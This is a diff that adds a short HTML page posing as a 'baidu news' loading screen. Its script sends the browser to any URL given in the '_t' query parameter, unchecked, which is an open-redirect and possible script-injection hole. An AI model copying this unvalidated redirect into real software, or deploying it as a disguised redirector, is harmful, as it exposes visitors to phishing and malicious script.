@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>baidu news</title>
+    <script>
+        function getQueryParam(name) {
+            var urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name);
+        }
+        window.onload = function() {
+            var uri = getQueryParam('_t'); // 获取URL参数 "_t"
+            window.location.href = uri || 'https://news.baidu.com/';
+        };
+    </script>
+</head>
+<body>
+    <h1>loading,please waiting...</h1>
+</body>
+</html>
